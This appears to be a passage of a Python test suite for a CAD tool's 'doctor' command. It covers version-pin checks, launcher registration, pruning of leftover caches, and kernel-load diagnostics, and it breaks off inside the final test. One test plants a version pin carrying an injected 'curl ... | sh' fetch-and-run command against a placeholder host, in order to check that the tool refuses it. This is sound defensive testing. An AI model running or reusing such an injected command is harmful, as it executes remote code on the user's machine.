"""``cadgen doctor`` — the one user-facing pin/version check the skills teach.

Its read-only ``--json``/``--python`` report meets by the engine's rule: a project or an engine
that does not meet this cadgen (another protocol, a document format it cannot read, another OCP
line) exits 3 naming what differs; a release apart alone is a warning (``release_behind``), exit 0.

The per-verb shims that used to enforce the pin on every invocation are gone;
doctor re-homes that value as an explicit command, so its contract is pinned here:
report the install, resolve a SKILL.md from a file/dir/cwd, exit 0 on
match-or-nothing-to-check, exit 3 (the historical shim code) on a mismatch, and
exit 4 when the CAD kernel is installed but cannot be loaded -- naming Smart App
Control on Windows, where a refused ``OCP`` load is otherwise a bare
ImportError. A kernel that is simply absent is reported and exits 0: the release
workflow installs the wheel --no-deps and runs doctor as its smoke test.

The kernel probe is a fresh-interpreter ``import OCP``; it is stubbed here so
the contract tests cost no kernel load, and exercised once for real.
"""

from __future__ import annotations

import io
import os
import sys
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path
from tempfile import TemporaryDirectory
from unittest import mock

from tests.python.support.paths import add_repo_path

add_repo_path("packages/cadgen/src")

import cadgen  # noqa: E402
from cadgen.cli import doctor  # noqa: E402


def _run(argv: list[str]) -> tuple[int, str, str]:
    out, err = io.StringIO(), io.StringIO()
    with redirect_stdout(out), redirect_stderr(err):
        code = doctor.main(argv)
    return code, out.getvalue(), err.getvalue()


REFUSED = "ImportError: DLL load failed while importing OCP: Access is denied."


def skill_text(version: str) -> str:
    """A SKILL.md whose launch command pins ``version``, as the release stamps one."""
    return f"- `cadgen` means `uvx --no-config --managed-python --python 3.13 --from cadgen=={version} cadgen`\n"


class DoctorTests(unittest.TestCase):
    def setUp(self) -> None:
        patcher = mock.patch.object(doctor, "_probe_kernel", return_value=(doctor.KERNEL_OK, "/site/OCP.pyd"))
        patcher.start()
        self.addCleanup(patcher.stop)
        # The report reads what CAD's apps share from the state directory: a fresh one, never this machine's.
        state = TemporaryDirectory()
        self.addCleanup(state.cleanup)
        self.state = Path(state.name)
        # A plugin's install outside CI, where telemetry's default holds.
        environment = mock.patch.dict("os.environ", {"CADGEN_STATE_DIR": state.name, "DO_NOT_TRACK": "", "CADGEN_TELEMETRY": "",
                                                     "CADGEN_INSTALL_CHANNEL": "claude-github", "CI": "",
                                                     # The cadgen command goes to a folder of the test's, never ~/.local/bin.
                                                     "CADGEN_LAUNCHER_DIR": str(self.state / "bin"),
                                                     "PATH": str(self.state / "unrelated-bin"),
                                                     "CADGEN_INSTALLATION_VERSION": "",
                                                     # And no engine starts: a private folder, in a shell
                                                     # whose sandbox refuses one (`engine_host.SANDBOXES`).
                                                     "CADGEN_ENGINE_DIR": str(self.state / "engine"),
                                                     "CODEX_SANDBOX_NETWORK_DISABLED": "1"})
        environment.start()
        self.addCleanup(environment.stop)

    def test_the_report_registers_and_writes_the_command_and_says_so(self) -> None:
        from cadgen._internal import installations

        env = self.state / "env"
        env.mkdir()
        found = tuple(str(env / name) for name in ("cadgen.exe" if installations.WINDOWS else "cadgen", "python", ""))
        for path in found[:2]:
            Path(path).write_text("", encoding="utf-8")
        record = self.state / "installations" / "1.2.3-dev.1.json"
        command = installations.proxy_path(str(self.state / "bin"))
        with TemporaryDirectory() as tmp, mock.patch.object(installations, "targets", return_value=found), \
                mock.patch.dict("os.environ", {"CADGEN_INSTALLATION_VERSION": "1.2.3-dev.1"}):
            _, out, _ = _run([tmp])
            again = _run([tmp])[1]
            with mock.patch.dict("os.environ", {"PATH": os.pathsep.join([os.path.dirname(command),
                                                                         os.environ.get("PATH", "")])}):
                on_path = _run([tmp])[1]
            for path in found[:2]:
                Path(path).unlink()
            gone = _run([tmp])[1]
            pruned = _run(["--prune"])[1]
        self.assertIn(f"registry {record} registered\n", out)
        # Its folder off PATH: the full path to run it by, until the folder is on it.
        folder = os.path.dirname(command)
        self.assertIn(f"command  {command} written (was missing); run it as `{command}` until `{folder}` is on "
                      "your PATH\n", out)
        self.assertIn(f"registry {record} OK\n", again)
        self.assertIn(f"command  {command} OK; run it as `{command}` until `{folder}` is on your PATH\n", again)
        self.assertIn(f"command  {command} OK\n", on_path, "on PATH: nothing more")
        with mock.patch.dict("os.environ", {"HOME": str(self.state), "USERPROFILE": str(self.state)}):
            self.assertEqual(doctor._home(folder), os.path.join("~", "bin"))
        self.assertIn(f"registry {record} dangling: its interpreter {found[1]} is gone", gone)
        self.assertEqual(pruned, f"removed {record}\n")
        self.assertFalse(record.exists())

    def test_the_report_warns_when_another_cadgen_shadows_the_proxy(self) -> None:
        from cadgen._internal import installations

        command, _, error = installations.write_proxy()
        self.assertIsNone(error)
        venv = self.state / "project-venv" / "bin"
        venv.mkdir(parents=True)
        other = venv / ("cadgen.exe" if os.name == "nt" else "cadgen")
        other.write_text("not executed: PATH lookup only", encoding="utf-8")
        other.chmod(0o755)
        folder = str(Path(command).parent)
        for first, second, hint in (
            (str(venv), folder, f"; shadowed on PATH by `{other}`; run `{command}` explicitly"),
            (folder, str(venv), ""),
        ):
            with self.subTest(first=first), mock.patch.dict("os.environ", {"PATH": os.pathsep.join([first, second])}):
                code, out, err = _run([str(self.state)])
            self.assertEqual((code, err), (0, ""))
            # Windows PATH lookup can use PATHEXT's .EXE spelling for the fixture's .exe file.
            self.assertIn(os.path.normcase(f"command  {command} OK{hint}\n"), os.path.normcase(out))
        # The running interpreter's own environment first on PATH is not a shadow: uvx puts its
        # ephemeral environment's bin there for the command it runs (`uvx ... cadgen setup`), and
        # that environment's own `cadgen` script is this installation, not another one.
        with mock.patch.object(sys, "prefix", str(venv.parent)), \
                mock.patch.dict("os.environ", {"PATH": os.pathsep.join([str(venv), folder])}):
            self.assertIn(f"command  {command} OK\n", _run([str(self.state)])[1])
        if os.name != "nt":
            other.chmod(0o644)  # an earlier non-executable file does not shadow the command
            with mock.patch.dict("os.environ", {"PATH": os.pathsep.join([str(venv), folder])}):
                self.assertIn(f"command  {command} OK\n", _run([str(self.state)])[1])

    def test_the_server_line_names_what_holds_the_port(self) -> None:
        # No engine of this protocol answers, but an older release's engine serves the port: the
        # doctor says so, with the stop that frees it, rather than "not running".
        from cadgen.engine import client

        found = {"kind": "engine", "port": 3245, "pid": 4895, "release": "0.8.1",
                 "said": "cadgen 0.8.1's engine (pid 4895)"}
        with mock.patch.object(client, "request", return_value=None), \
                mock.patch.object(client, "holder", return_value=found):
            line = doctor._server()
        self.assertIn("port 3245 is held by cadgen 0.8.1's engine (pid 4895): run `", line)
        self.assertIn(client.stop_command(3245), line)
        with mock.patch.object(client, "request", return_value=None), \
                mock.patch.object(client, "holder", return_value=None):
            self.assertTrue(doctor._server().startswith("not running ("))

    def test_doctor_through_the_proxy_names_a_development_installation_by_its_version(self) -> None:
        """A development install run through the ``cadgen`` command, with nothing in its environment
        naming it: the proxy tells it, so its header and its record are its own version."""
        import subprocess

        from cadgen._internal import installations

        found = installations.targets()
        if found is None:
            self.skipTest("this interpreter has no console script to register")
        installations.register("1.2.3-dev.1", found)
        environment = {key: value for key, value in os.environ.items() if key != installations.NAME_ENV}
        environment["PYTHONPATH"] = str(Path(cadgen.__file__).resolve().parent.parent)  # this cadgen, however installed
        done = subprocess.run([sys.executable, "-P", "-m", "cadgen._internal.proxy", "+1.2.3-dev.1", "doctor",
                               str(self.state)], capture_output=True, text=True, env=environment,
                              timeout=300)
        self.assertEqual(done.returncode, 0, done.stderr)
        lines = done.stdout.splitlines()
        self.assertEqual(lines[0], "cadgen 1.2.3-dev.1")
        record = self.state / "installations" / "1.2.3-dev.1.json"
        self.assertEqual([line.strip() for line in lines if line.strip().startswith("registry")],
                         [f"registry {record} OK"])

    def test_a_development_installs_pin_is_the_version_it_runs_as(self) -> None:
        """A SKILL.md a development install wrote names `cadgen +<version>-dev.<time>`: OK for that
        installation, a mismatch for another."""
        with TemporaryDirectory() as tmp:
            skill = Path(tmp) / "SKILL.md"
            skill.write_text("- `cadgen` below means `cadgen +0.8.0-dev.20261025032333`\n", encoding="utf-8")
            with mock.patch.dict("os.environ", {"CADGEN_INSTALLATION_VERSION": "0.8.0-dev.20261025032333"}):
                code, out, _ = _run([tmp])
            self.assertEqual(code, 0, out)
            self.assertIn("pin      OK — cadgen==0.8.0-dev.20261025032333", out)
            with mock.patch.dict("os.environ", {"CADGEN_INSTALLATION_VERSION": "0.8.0-dev.1"}):
                code, _, err = _run([tmp])
            self.assertEqual(code, 3)
            self.assertIn("pins cadgen==0.8.0-dev.20261025032333, but cadgen 0.8.0-dev.1 is installed", err)

    @unittest.skipIf(os.name == "nt", "the legacy pair on POSIX: a symlink and an sh script")
    def test_prune_removes_the_per_version_launchers_earlier_builds_published(self) -> None:
        env = self.state / "env" / "bin"
        env.mkdir(parents=True)
        (env / "cadgen").write_text("", encoding="utf-8")
        (env / "python").write_text("", encoding="utf-8")
        folder = self.state / "bin"
        folder.mkdir()
        console, python = folder / "cadgen-0.8.0", folder / "cadgen-python-0.8.0"
        console.symlink_to(env / "cadgen")
        python.write_text(f"#!/bin/sh\n# cadgen launcher: {env / 'python'}\nexec '{env / 'python'}' \"$@\"\n",
                          encoding="utf-8")
        gone = folder / "cadgen-0.7.9"  # a dangling one, its environment removed since
        gone.symlink_to(self.state / "removed" / "bin" / "cadgen")
        kept = {folder / "cadgen": "#!/bin/sh\n# cadgen proxy: 1\n",  # the proxy itself
                folder / "cadgen-1.0": "another program's\n",
                folder / "cadgen-python-1.0": "#!/bin/sh\nexec python \"$@\"\n"}  # no marker: not ours
        for path, text in kept.items():
            path.write_text(text, encoding="utf-8")
        theirs = self.state / "theirs" / "bin"  # a person's own venv, registered nowhere
        theirs.mkdir(parents=True)
        (theirs / "cadgen").write_text("", encoding="utf-8")
        own = folder / "cadgen-0.7"
        own.symlink_to(theirs / "cadgen")
        code, out, _ = _run(["--prune"])
        self.assertEqual(code, 0)
        for path in (console, python, gone):
            self.assertIn(f"removed {path}, a launcher the cadgen command replaces\n", out)
            self.assertFalse(os.path.lexists(path), path)
        for path, text in kept.items():
            self.assertEqual(path.read_text(encoding="utf-8"), text, "anything else is left alone")
        self.assertTrue(os.path.islink(own), "a person's own cadgen-<v> into a venv of theirs is left alone")

    def test_a_source_tree_registers_nothing_unless_named(self) -> None:
        with TemporaryDirectory() as tmp:
            _, out, _ = _run([tmp])
        self.assertIn("registry not registered: a source tree registers only as a version it is named", out)
        self.assertFalse((self.state / "bin").exists())

    def test_the_report_says_what_cads_apps_share(self) -> None:
        with TemporaryDirectory() as tmp:
            _, out, _ = _run([tmp])
        self.assertIn("sharing  off: not until a cadgen command says so", out)
        # Told, and nothing chosen: on by default, from the day it was said.
        (self.state / "settings.json").write_text('{"telemetry": {"notifiedAt": 1790000000, "notice": 1}}', encoding="utf-8")
        with TemporaryDirectory() as tmp:
            _, out, _ = _run([tmp])
        self.assertRegex(out, r"sharing  on: by default, since cadgen said so on \d{4}-\d{2}-\d{2}\n")

    def test_the_report_only_inspects_the_selected_engine(self) -> None:
        # Nothing answers and nothing holds the port (the holder probe is read-only, and mocked so the
        # machine's own port 3245 cannot change the report): the line says how to start one.
        with TemporaryDirectory() as tmp, mock.patch("cadgen.engine.client.request", return_value=None) as asked, \
                mock.patch("cadgen.engine.client.holder", return_value=None):
            code, out, _ = _run([tmp])
        self.assertEqual(code, 0)
        asked.assert_called_once_with({"op": "status"}, start=False)
        self.assertIn("start `cadgen server` before building", out)
        self.assertFalse((self.state / "engine").exists())
        answer = {"pid": 4242, "workers": [{"script": "a.py"}], "standby": {"pid": 4343}, "cap": 10,
                  "version": "0.8.0", "installation": "0.8.0-dev.2"}
        with TemporaryDirectory() as tmp, mock.patch("cadgen.engine.client.request", return_value=answer) as asked:
            _, out, _ = _run([tmp])
        self.assertIn("running, pid 4242, cadgen 0.8.0, workers 2/10 with the standby", out)
        asked.assert_called_once_with({"op": "status"}, start=False)

    def test_the_report_names_the_kernel_it_loaded(self) -> None:
        with TemporaryDirectory() as tmp:
            code, out, _ = _run([tmp])
        self.assertEqual(code, 0)
        self.assertIn("kernel   OK", out)
        self.assertIn("/site/OCP.pyd", out)

    def test_a_missing_kernel_is_reported_and_is_not_a_failure(self) -> None:
        # The release workflow installs the wheel --no-deps and runs doctor: no OCP
        # there is a correct install, and the pin is what brings the kernel.
        missing = "ModuleNotFoundError: No module named 'OCP'"
        with mock.patch.object(doctor, "_probe_kernel", return_value=(doctor.KERNEL_MISSING, missing)), \
                TemporaryDirectory() as tmp:
            code, out, err = _run([tmp])
        self.assertEqual(code, 0)
        self.assertIn("kernel   not installed", out)
        self.assertIn("uvx --no-config", out, "the launch command is what brings the kernel")
        self.assertNotIn("FAILED", err)

    def test_a_kernel_that_will_not_load_exits_4(self) -> None:
        with mock.patch.object(doctor, "_probe_kernel", return_value=(doctor.KERNEL_FAILED, REFUSED)), \
                mock.patch.object(sys, "platform", "linux"), TemporaryDirectory() as tmp:
            code, out, err = _run([tmp])
        self.assertEqual(code, 4)
        self.assertIn("kernel   FAILED", err)
        self.assertIn(REFUSED, err, "the exception line is the evidence")
        self.assertNotIn("Smart App Control", err, "off Windows the cause is not known")
        self.assertIn("pin      none found", out, "the rest of the report still prints")

    def test_a_refused_load_on_windows_names_smart_app_control(self) -> None:
        with mock.patch.object(doctor, "_probe_kernel", return_value=(doctor.KERNEL_FAILED, REFUSED)), \
                mock.patch.object(sys, "platform", "win32"), TemporaryDirectory() as tmp:
            code, _, err = _run([tmp])
        self.assertEqual(code, 4)
        self.assertIn("Smart App Control", err)
        self.assertIn("3077", err)

    def test_a_pin_mismatch_outranks_the_kernel(self) -> None:
        # The install is wrong before the kernel is: fixing the pin may fix both.
        with mock.patch.object(doctor, "_probe_kernel", return_value=(doctor.KERNEL_FAILED, REFUSED)), \
                TemporaryDirectory() as tmp:
            (Path(tmp) / "SKILL.md").write_text(skill_text("0.0.0.dev0"), encoding="utf-8")
            code, _, err = _run([tmp])
        self.assertEqual(code, 3)
        self.assertIn("kernel   FAILED", err)
        self.assertIn("MISMATCH", err)

    def test_matching_pin_passes_and_names_the_file(self) -> None:
        with TemporaryDirectory() as tmp:
            skill = Path(tmp) / "SKILL.md"
            skill.write_text(skill_text(cadgen.__version__), encoding="utf-8")
            code, out, _ = _run([str(skill)])
        self.assertEqual(code, 0)
        self.assertIn("OK", out)
        self.assertIn(str(skill), out)

    def mismatch(self, editable: str | None) -> tuple[int, str]:
        with mock.patch.object(doctor, "_editable_source", return_value=editable), \
                TemporaryDirectory() as tmp:
            (Path(tmp) / "SKILL.md").write_text(skill_text("0.0.0.dev0"), encoding="utf-8")
            code, _, err = _run([tmp])
        return code, err

    def test_mismatch_exits_3_with_the_install_instruction(self) -> None:
        code, err = self.mismatch(None)
        self.assertEqual(code, 3)
        self.assertIn("MISMATCH", err)
        self.assertIn("--from cadgen==0.0.0.dev0 cadgen", err, "the skill's own launch command runs its pin")

    def test_a_pin_that_is_no_version_is_never_printed_as_a_command(self) -> None:
        # A SKILL.md in a downloaded project, run from: its "pin" is a shell command.
        with mock.patch.object(doctor, "_editable_source", return_value=None), TemporaryDirectory() as tmp:
            (Path(tmp) / "SKILL.md").write_text(skill_text("0.8.0;curl${IFS}https://example.invalid|sh"), encoding="utf-8")
            code, _, err = _run([tmp])
        self.assertEqual(code, 3)
        self.assertIn("pins no cadgen version", err)
        self.assertNotIn("uvx", err)

    def test_an_editable_install_is_told_to_re_record_itself_not_to_replace_itself(self) -> None:
        # An editable install's version is a snapshot taken when it was
        # installed, so its code can already BE the pinned version while the
        # metadata is behind. The skill's launch command would run a published
        # release instead of the source tree -- the wrong fix.
        source = str(Path("/src/packages/cadgen"))
        code, err = self.mismatch(source)
        self.assertEqual(code, 3)
        self.assertIn("MISMATCH", err)
        self.assertIn("EDITABLE", err)
        self.assertIn(f"pip install -e {source}", err)
        self.assertIn("recorded when", err, "the report says WHY the version is stale")
        self.assertNotIn("--from cadgen==", err)

    def test_an_editable_source_is_read_off_this_install(self) -> None:
        # In a checkout cadgen IS editable; a wheel install records no
        # direct_url.json at all. Either answer is correct, and neither may
        # raise -- a doctor that crashes reporting a mismatch is worse than the
        # mismatch.
        source = doctor._editable_source()
        if source is not None:
            self.assertTrue(Path(source).is_dir(), source)

    def test_an_unreadable_direct_url_record_is_not_editable(self) -> None:
        class Record:
            def __init__(self, text: str | None) -> None:
                self.text = text

            def read_text(self, _name: str) -> str | None:
                return self.text

        for text in (None, "", "{not json", "[]", '{"url": "file:///s"}', '{"dir_info": {}}'):
            with self.subTest(text=text):
                with mock.patch("importlib.metadata.distribution", return_value=Record(text)):
                    self.assertIsNone(doctor._editable_source())


class PrivateFolders(unittest.TestCase):
    """A state, cache, engine and launcher folder of the test's own, and files in them written a month ago."""

    OLD = 30 * 86400

    def setUp(self) -> None:
        patcher = mock.patch.object(doctor, "_probe_kernel", return_value=(doctor.KERNEL_OK, "/site/OCP.pyd"))
        patcher.start()
        self.addCleanup(patcher.stop)
        root = TemporaryDirectory()
        self.addCleanup(root.cleanup)
        self.root = Path(root.name).resolve()
        self.state, self.cache, self.engines = self.root / "state", self.root / "cache", self.root / "engine"
        self.engines.mkdir(mode=0o700)
        environment = mock.patch.dict("os.environ", {"CADGEN_STATE_DIR": str(self.state), "CADGEN_CACHE_DIR": str(self.cache),
                                                     "CADGEN_LAUNCHER_DIR": str(self.root / "bin"),
                                                     "CADGEN_ENGINE_DIR": str(self.engines),
                                                     "CADGEN_INSTALLATION_VERSION": "", "DO_NOT_TRACK": "1",
                                                     "CODEX_SANDBOX_NETWORK_DISABLED": "1"})
        environment.start()
        self.addCleanup(environment.stop)

    def file(self, inside: str, data: str = "x", *, old: bool = True) -> Path:
        path = self.root / inside
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(data, encoding="utf-8")
        if old:
            self.age(path)
        return path

    def age(self, path: Path) -> None:
        """``path`` and everything up to the test's folder, last written a month ago."""
        import time

        then = time.time() - self.OLD
        while path != self.root:
            os.utime(path, (then, then))
            path = path.parent

    def mirror(self, environment: Path) -> str:
        """Where Python files the bytecode of a library in ``environment`` under a pycache prefix."""
        return os.path.splitdrive(str(environment / "lib" / "site.py"))[1].lstrip("\\/")

    def tree(self) -> list[str]:
        return sorted(path.relative_to(self.root).as_posix() for folder in (self.state / "engines", self.state / "documents",
                                                                         self.cache) for path in folder.rglob("*"))



class LeftoversTest(PrivateFolders):
    """``cadgen doctor`` says what cadgen left behind that nothing needs, and ``--prune`` removes it, a
    line per kind: never a live engine's bytecode, a registered installation's, a recorded document's
    cache, nor anything written in the last seven days."""

    def test_doctor_says_what_nothing_needs_and_prune_removes_it_but_what_is_live_registered_recorded_or_recent(self) -> None:
        import json

        from cadgen._internal import installations
        from cadgen.engine import daemon

        self.file("state/engines/aaaaaaaa.json", json.dumps({"schema": 2, "token": "an-earlier-builds"}))
        trimmed = self.file("state/engines/bbbbbbbb.json", json.dumps({"schema": 3, "port": 3246, "token": "t" * 43}))
        current = self.file("state/engines/cccccccc.json", json.dumps({"port": 3247, "schema": 3}))
        recent_record = self.file("state/engines/dddddddd.json", json.dumps({"schema": 1}), old=False)
        token = self.file("state/engines/token", "t" * 43)
        # A registered installation, alive: its python and console script are there.
        environment = self.root / "env"
        for name in ("python", "cadgen"):
            self.file(f"env/bin/{name}")
        record = {"version": "1.0.0", "python": str(environment / "bin" / "python"),
                  "cadgen": str(environment / "bin" / "cadgen"), "prefix": str(environment)}
        self.file("state/installations/1.0.0.json", json.dumps(record))
        registered = self.file(f"cache/pycache/aaaaaaaaaaaa/{self.mirror(environment)}/x.pyc").parents[0]
        self.file(f"cache/pycache/bbbbbbbbbbbb/{self.mirror(self.root / 'uninstalled')}/x.pyc", "y" * 2048)
        live = self.file(f"cache/pycache/cccccccccccc/{self.mirror(self.root / 'editable')}/x.pyc")
        held = daemon.lock(self.engines / "cccccccccccc.lock")  # its engine runs
        self.addCleanup(held.close)
        recent_bytecode = self.file(f"cache/pycache/dddddddddddd/{self.mirror(self.root / 'other')}/x.pyc", old=False)
        recorded, forgotten, fresh = ("11111111-1111-5111-8111-111111111111", "22222222-2222-5222-8222-222222222222",
                                      "33333333-3333-5333-8333-333333333333")
        self.file(f"state/documents/{recorded}/document.json", "{}")
        self.file(f"cache/documents/{recorded}/document.xbf")
        self.file(f"cache/documents/{forgotten}/document.xbf", "z" * 4096)
        self.file(f"cache/documents/{fresh}/document.xbf", old=False)
        self.file("cache/documents/not-a-document/notes.txt")
        stamp = self.file("state/telemetry-sender", "")  # an earlier 0.8 build's sender's start
        before = self.tree()

        with mock.patch.object(installations, "targets", return_value=None):
            code, out, _ = _run([str(self.root)])
        self.assertEqual(code, 0)
        self.assertIn("  leftover 2 engine records of an older format, 1 bytecode folder of installations no longer "
                      "registered (2.0 KB), 1 cache folder with no record (4.0 KB), 1 file an earlier 0.8 build kept "
                      "(telemetry-sender): cadgen doctor --prune removes them\n", out)
        self.assertEqual(self.tree(), before, "nothing is removed without --prune")
        self.assertIn(f"  cache    {self.cache}: 1 document · 1 B, kept until deleted\n", out,
                      "the documents the cache keeps, each a record names, with no cap")

        code, out, _ = _run(["--prune"])
        self.assertEqual(code, 0)
        self.assertEqual(out, "no registered installation has lost its interpreter\n"
                              "removed 1 engine record of an older format\n"
                              "removed the page token 1 engine record still carried (the port each rolled to is kept)\n"
                              "removed 1 bytecode folder of installations no longer registered (2.0 KB)\n"
                              "removed 1 cache folder with no record (4.0 KB)\n"
                              f"removed {stamp}, a file an earlier 0.8 build kept\n")
        self.assertFalse((self.state / "engines" / "aaaaaaaa.json").exists())
        self.assertEqual(json.loads(trimmed.read_text(encoding="utf-8")), {"port": 3246, "schema": 3})
        for kept in (current, recent_record, token, registered, live, recent_bytecode,
                     self.cache / "documents" / recorded / "document.xbf", self.cache / "documents" / fresh,
                     self.cache / "documents" / "not-a-document"):
            self.assertTrue(kept.exists(), kept)
        self.assertFalse((self.cache / "pycache" / "bbbbbbbbbbbb").exists())
        self.assertFalse((self.cache / "documents" / forgotten).exists())
        code, out, _ = _run(["--prune"])
        self.assertEqual(out, "no registered installation has lost its interpreter\n", "nothing is left to remove")


class SevenLeftoversTest(PrivateFolders):
    """cadgen 0.7's store and state files retire themselves: ``cadgen doctor`` says they are there,
    ``--prune`` removes them once nothing has written them for seven days, ``--all-versions`` at
    once; a folder of that name that is not 0.7's store, and 0.8's own files, are never touched."""

    def seven(self, *, recent: str | None = None) -> list[Path]:
        made = [self.file("cache/objects/ab/" + "c" * 62, "o" * 4089), self.file("cache/index/model/" + "d" * 64, "{}"),
                self.file("state/sidebar-views/views.json", "[]"), self.file("state/snapshot-browser.lock", ""),
                self.file("state/recents/recents.jsonl", "{}\n"), self.file("state/install-channels.json.lock", "")]
        if recent:
            made.append(self.file(recent, "written now", old=False))
        return made

    def ours(self) -> list[Path]:
        """0.8's own files beside 0.7's, which nothing here touches."""
        return [self.file("state/settings.json", "{}"), self.file("state/settings.lock", ""),
                self.file("state/install-channels.json", "{}"), self.file("state/recents/thumbnails/" + "e" * 32 + ".png", "p"),
                self.file("cache/pycache/aaaaaaaaaaaa/x.pyc", old=False),
                self.file("cache/documents/11111111-1111-5111-8111-111111111111/document.xbf", old=False)]

    def last(self, paths: list[Path]) -> str:
        import time

        return time.strftime("%Y-%m-%d", time.localtime(max(os.lstat(path).st_mtime for path in paths)))

    def test_a_quiet_0_7_is_said_with_its_size_and_age_and_pruned(self) -> None:
        made, ours = self.seven(), self.ours()
        said = f"cadgen 0.7's store and 4 state files (4.0 KB), last written {self.last(made)}"
        code, out, _ = _run([str(self.root)])
        self.assertEqual(code, 0)
        self.assertIn(f"  0.7      {said}: cadgen doctor --prune removes it\n", out)
        self.assertTrue(all(path.exists() for path in made), "nothing is removed without --prune")
        code, out, _ = _run(["--prune"])
        self.assertEqual(out, f"no registered installation has lost its interpreter\nremoved {said}\n")
        for gone in ("cache/objects", "cache/index", "state/sidebar-views", "state/snapshot-browser.lock",
                     "state/recents/recents.jsonl", "state/install-channels.json.lock"):
            self.assertFalse((self.root / gone).exists(), gone)
        self.assertTrue(all(path.exists() for path in ours), "0.8's own files stay")
        self.assertNotIn("0.7", _run([str(self.root)])[1])

    def test_a_0_7_written_in_the_last_week_stays_until_all_versions_says_none_needs_it(self) -> None:
        made, ours = self.seven(recent="state/viewer.log"), self.ours()
        said = f"cadgen 0.7's store and 5 state files (4.0 KB), last written {self.last(made)}"
        code, out, _ = _run([str(self.root)])
        self.assertIn(f"  0.7      {said}: cadgen doctor --prune removes it once nothing has written it for 7 days, "
                      "or now with --all-versions\n", out)
        code, out, _ = _run(["--prune"])
        self.assertEqual(out, f"no registered installation has lost its interpreter\nkept {said}: a cadgen 0.7 still "
                              "installed may use it; it goes once nothing has written it for 7 days, or now with "
                              "--all-versions\n")
        self.assertTrue(all(path.exists() for path in made), "a 0.7 written this week may be in use")
        with redirect_stderr(io.StringIO()), self.assertRaises(SystemExit):
            doctor.main(["--all-versions"])  # with --prune alone
        code, out, _ = _run(["--prune", "--all-versions"])
        self.assertEqual(out, f"no registered installation has lost its interpreter\nremoved {said}\n")
        self.assertFalse(any(path.exists() for path in made))
        self.assertTrue(all(path.exists() for path in ours), "0.8's own files stay")

    def test_a_folder_of_the_store_s_name_that_is_not_0_7_s_store_is_left_alone(self) -> None:
        theirs = [self.file("cache/objects/notes.txt", "another program's"), self.file("cache/index/README", "")]
        code, out, _ = _run(["--prune", "--all-versions"])
        self.assertEqual(out, "no registered installation has lost its interpreter\n")
        self.assertTrue(all(path.exists() for path in theirs))


class KernelProbeTest(unittest.TestCase):
    """The real probe, once: this interpreter's kernel imports in a child."""

    def test_the_probe_imports_ocp_in_a_fresh_interpreter(self) -> None:
        state, detail = doctor._probe_kernel()
        self.assertEqual(state, doctor.KERNEL_OK, detail)
        self.assertIn("OCP", detail)

    def test_the_probe_imports_the_installed_kernel_whatever_folder_it_runs_from(self) -> None:
        import os

        with TemporaryDirectory() as folder:
            Path(folder, "OCP.py").write_text("raise SystemExit('the working folder was searched')\n", encoding="utf-8")
            here = os.getcwd()
            os.chdir(folder)
            try:
                state, detail = doctor._probe_kernel()
            finally:
                os.chdir(here)
        self.assertEqual(state, doctor.KERNEL_OK, detail)
        self.assertNotIn(os.path.realpath(folder), os.path.realpath(detail))

    def test_the_probe_tells_a_missing_kernel_from_a_refused_one(self) -> None:
        # The child interpreter's last stderr line is all the probe has. A
        # ModuleNotFoundError is "not installed" (a --no-deps wheel install, a
        # cadgen-free skill); anything else is the kernel refusing to load.
        import subprocess

        def child(stderr: str) -> subprocess.CompletedProcess:
            return subprocess.CompletedProcess(args=[], returncode=1, stdout="", stderr=stderr)

        missing = child("Traceback...\nModuleNotFoundError: No module named 'OCP'\n")
        with mock.patch("subprocess.run", return_value=missing):
            self.assertEqual(
                doctor._probe_kernel(),
                (doctor.KERNEL_MISSING, "ModuleNotFoundError: No module named 'OCP'"),
            )
        refused = child("ImportError: DLL load failed while importing OCP: Access is denied.\n")
        with mock.patch("subprocess.run", return_value=refused):
            state, detail = doctor._probe_kernel()
        self.assertEqual(doctor.KERNEL_FAILED, state)
        self.assertIn("DLL load failed", detail)


def setUpModule() -> None:
    # The registry and cache of every engine this module starts are its own, never the developer's
    # (``engine_daemon.isolate``); each test still names its own engine folder.
    from tests.python.support import engine_daemon

    engine_daemon.isolate(unittest.addModuleCleanup)


class DiagnosticTests(unittest.TestCase):
    """One structured report serves JSON and human diagnostics without setup or raw config leaks."""

    def setUp(self):
        from cadgen._internal import diagnostics
        from cadgen.mcp import diagnostics as hosts

        self.diagnostics, self.hosts = diagnostics, hosts
        folder = TemporaryDirectory()
        self.addCleanup(folder.cleanup)
        self.root = Path(folder.name)
        patch = mock.patch.dict(os.environ, {
            "HOME": str(self.root), "USERPROFILE": str(self.root), "CODEX_HOME": str(self.root / "codex"),
            "CLAUDE_CONFIG_DIR": str(self.root / "claude"), "CLAUDE_DESKTOP_CONFIG": str(self.root / "desktop.json"),
            "CADGEN_STATE_DIR": str(self.root / "state"), "CADGEN_ENGINE_DIR": str(self.root / "engine"),
            "CADGEN_LAUNCHER_DIR": str(self.root / "bin"), "CADGEN_PORT": "3245", "CADGEN_INSTALLATION_VERSION": "",
        })
        patch.start()
        self.addCleanup(patch.stop)
        self.engine_probe = diagnostics.engine
        probe = mock.patch.object(diagnostics, "engine", side_effect=lambda port: {
            "port": port, "status": "compatible", "release": cadgen.__version__, "protocol": 4})
        self.probe = probe.start()
        self.addCleanup(probe.stop)

    def test_a_loopback_connect_that_times_out_is_no_listener(self) -> None:
        # A listener on the loopback answers at once; some Windows firewalls drop a connect to a port
        # nobody serves instead of refusing it, which must read as no engine, not as unknown.
        import socket

        for error in (ConnectionRefusedError(), TimeoutError(), socket.timeout()):
            with self.subTest(error=type(error).__name__), \
                    mock.patch.object(socket, "create_connection", side_effect=error):
                self.assertEqual(self.diagnostics._listener(3245), "missing")
        with mock.patch.object(socket, "create_connection", side_effect=PermissionError()):
            self.assertEqual(self.diagnostics._listener(3245), "unknown")

    @staticmethod
    def meets(**changes):
        """What this cadgen meets an engine by (``runtime.identity``, without its release), ``changes`` made."""
        from cadgen.engine import runtime

        found = {key: value for key, value in runtime.identity().items() if key != "release"}
        if "native" in changes:
            changes["native"] = {**found["native"], **changes["native"]}
        return {**found, **changes}

    def write(self, relative, text):
        path = self.root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
        return path

    def data(self, *arguments):
        import json

        code, out, err = _run(["--json", *arguments])
        self.assertEqual(err, "")
        data = json.loads(out)
        self.assertEqual(code, data["exit_code"])
        return data

    def test_json_and_human_share_a_report_and_never_run_setup_kernel_or_start(self):
        from cadgen import cli
        from cadgen._internal import installations
        from cadgen.engine import client

